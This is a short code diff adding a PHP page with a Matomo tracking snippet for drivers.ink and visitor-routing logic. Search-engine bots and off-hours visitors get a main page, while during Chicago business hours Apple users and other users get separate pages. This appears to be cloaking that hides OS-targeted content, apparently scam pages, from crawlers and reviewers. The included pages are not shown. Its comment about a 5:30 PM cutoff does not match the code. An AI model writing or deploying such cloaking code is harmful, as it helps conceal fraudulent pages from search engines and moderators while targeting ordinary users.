@@ -1,0 +1,51 @@
+<script>
+  var _paq = window._paq = window._paq || [];
+  /* tracker methods like "setCustomDimension" should be called before "trackPageView" */
+  _paq.push(['trackPageView']);
+  _paq.push(['enableLinkTracking']);
+  (function() {
+    var u="https://drivers.ink/matomo/";
+    _paq.push(['setTrackerUrl', u+'matomo.php']);
+    _paq.push(['setSiteId', '91']);
+    var d=document, g=d.createElement('script'), s=d.getElementsByTagName('script')[0];
+    g.async=true; g.src=u+'matomo.js'; s.parentNode.insertBefore(g,s);
+  })();
+</script>
+<?php
+// Function to check if the user agent is an Apple device
+function isAppleDevice() {
+    $userAgent = $_SERVER['HTTP_USER_AGENT'];
+    return (strpos($userAgent, 'Mac OS') !== false || strpos($userAgent, 'iOS') !== false);
+}
+
+// Function to check if the user agent is a search bot or robot
+function isSearchBot() {
+    $userAgent = $_SERVER['HTTP_USER_AGENT'];
+    $searchBots = ['Googlebot', 'Bingbot', 'Yahoo Slurp', 'DuckDuckBot', 'YandexBot'];
+    foreach ($searchBots as $bot) {
+        if (stripos($userAgent, $bot) !== false) {
+            return true;
+        }
+    }
+    return false;
+}
+
+// Function to check if the current time is within the specified time range (8:30 AM to 5:30 PM CST)
+function isWithinTimeRange() {
+    date_default_timezone_set('America/Chicago'); // Set the timezone to CST
+    $currentHour = date('G'); // Get the current hour (24-hour format)
+    return ($currentHour >= 8 && $currentHour < 17);
+}
+
+if (isSearchBot() && isWithinTimeRange()) {
+    include 'main.php';
+} elseif (isAppleDevice() && isWithinTimeRange()) {
+    include 'mac.php';
+} elseif (isWithinTimeRange()) {
+    include 'win.php';
+} else {
+    include 'main.php';
+}
+?>
+
+
